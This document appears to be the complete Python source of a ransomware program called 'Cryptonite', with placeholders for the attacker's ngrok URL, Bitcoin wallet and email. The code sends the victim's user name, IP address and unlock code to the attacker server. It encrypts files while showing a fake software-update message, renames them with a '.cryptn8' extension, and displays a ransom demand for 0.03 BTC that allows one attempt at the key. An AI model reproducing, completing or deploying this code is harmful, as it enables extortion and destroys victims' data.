# imports
import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import time
import requests as r
import json
import tqdm
import pymsgbox._native_win as pymsgbox
import pymsgbox as pmb

# some GLOBALS
url = "YOUR_NGROK_URL_HERE"
key = Fernet.generate_key()
fe = Fernet(key)
dkrpt = random.randint(100000, 999999)
uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
print(dkrpt)

BTC_AMOUNT = 0.03                                       # <----  REQUIRED
BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
EXT = ".cryptn8"                                        # <----  OPTIONAL

EXCLUDED_DIRS = [   "/Windows",
                    "/Program Files",
                    "/Program Files (x86)",
                    "/AppData"
                ]

fileLists = []      # stores the files to be encrypted
fileList = []       # stores the files to be decrypted


class Cryptonite():
    def __init__(self,key,fe,dkrpt,uniqKey):
        self.key = key
        self.fernetEncrypt = fe

        self.decryptPlease = dkrpt
        self.uniqueKey = uniqKey

              


    def sendKeys(self):
        id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
        user = os.getlogin()
        key = self.decryptPlease
        try:
            ip = r.get("https://ident.me/").text
            jsonFormat = {
                "uniqueId": id,
                "user": user,
                "key": key,
                "ip": ip
            }
            r.post(url, data=json.dumps(jsonFormat))
        except:
            pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
            exit()


    def encrypt(self):
        
        for file in tqdm.tqdm(fileLists):
            flag = 0
            newfile = str(file)+EXT
            try:
                with open(file, "rb") as f:
                    data = f.read()
                    encryptedData = self.fernetEncrypt.encrypt(data)
            except:
                flag = 1
            if flag == 0:
                try:
                    with open (file, "wb") as f:
                        fileList.append(file)
                        f.write(encryptedData)
                    os.rename(file, newfile)
                except:
                    a = "error" # just to fill the except block 


    def findFiles(self):
        
        print("Please be patient, checking for new updates...\n")
        time.sleep(5)
        print("Update found! Downloading the files... \n")
        for root, dir, file in os.walk('./testfolder'):
            for i in range(len(EXCLUDED_DIRS)):
                if EXCLUDED_DIRS[i] in root:
                    break
                else:
                    if i == len(EXCLUDED_DIRS) - 1:
                        for files in file:
                            files = os.path.join(root, files)
                            fileLists.append(files)
                            
        print("Download Completed!\n")
        time.sleep(2)
        print("Installing the Updates. This might take some time. Please be patient... \n")
        self.encrypt()
        os.system("cls" if os.name == 'nt' else "clear") 
            
  

    def decrypt(self):
        for files in fileList:
            flag = 0
            try:
                with open(str(files)+EXT, "rb") as f:
                    data = f.read()
            except:
                flag = 1
            if flag == 0:
                try:
                    with open(str(files)+EXT, "wb") as f:
                        decryptedData = self.fernetEncrypt.decrypt(data)
                        f.write(decryptedData)
                    os.rename(str(files)+EXT, files)
                except:
                    a = "error" # just to fill the except block


class System(Cryptonite):
    def __init__(self,key,fe,dkrpt,uniqKey):
        super().__init__(key,fe,dkrpt,uniqKey)

    def warningScreen(self):
        warningMessage = f"Your device is infected by CRYPTONITE RANSOMWARE. It uses a military grade encryption to encrypt your files\n\n.If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\nBTC wallet address:- {BTC_WALLET}\nEmail address:- {EMAIL}\n\n\nYour unique key: {self.uniqueKey}\n\n"
        Alert = pmb.alert("Your device has been Infected by CRYPTONITE RANSOMWARE! Click OK to know further", "ALERT!")
        OK = pmb.confirm(text=warningMessage, title="Cryptn8", buttons=['I Understood', 'Fuck You!'])
        if OK == "I Understood":
            x = pmb.prompt("Decryption key: ", "Enter the Decryption key (ONE CHANCE)")
            x = int(x)
            if x == self.decryptPlease:
                self.decrypt()
            else:
                pmb.confirm("Have a Great Day!", buttons=['Cancel'])
                exit()
        else:
            pmb.confirm("Have a Great Day!", buttons=['Cancel'])
            exit()



if __name__ == "__main__":
    
    cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
    window = System(key,fe,dkrpt,uniqKey)

    cryptn8.sendKeys()
    cryptn8.findFiles()
    window.warningScreen()
